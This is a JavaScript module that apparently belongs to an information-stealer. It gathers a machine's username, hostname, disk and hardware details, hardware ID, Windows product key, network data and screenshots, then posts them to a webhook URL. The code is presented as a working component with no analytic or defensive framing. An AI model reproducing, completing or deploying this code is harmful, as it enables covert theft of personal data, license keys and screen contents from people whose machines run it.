const {
    webhook 
} = require('../../utils/request/webhook.js');

const { 
    systemInfo 
} = require('../../utils/harware/systemInfo.js');

module.exports = async (webhookUrl) => {
    const { 
        WINDOWS_VERSION,
        WINDOWS_KEY,
        SCREENSHOTS,
        DISKS_INFO,
        CPU_COUNT,
        NETWORK,
        UUID,
        DISK,
        CPU,
        GPU,
        RAM,
        IP,
        OS,
    } = await systemInfo();

    const data = {
        embeds: [
            {
                title: "System Information",
                fields: [
                    { name: "User", value: `\`\`\`\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.USERDOMAIN}\n\`\`\`` },
                    { name: "Disks", value: `\`\`\`\n${DISKS_INFO}\n\`\`\`` },
                    { name: "System", value: `\`\`\`\nOS: ${OS}\nCPU: ${CPU}\nGPU: ${GPU}\nRAM: ${RAM}\nHWID: ${UUID}\nProduct Key: ${WINDOWS_KEY}\n\`\`\`` },
                    { name: "Network", value: `\`\`\`\n${Object.entries(NETWORK).map(([name, value]) => `${name}: ${value}`).join("\n")}\n\`\`\`` },
                ]
            }
        ]
    };

    const screen = SCREENSHOTS.length > 0 ? SCREENSHOTS : null

    try {
        await webhook(webhookUrl, data, screen)
    } catch (error) {
        console.error("Failed to send webhookUrl:", error);
    }
}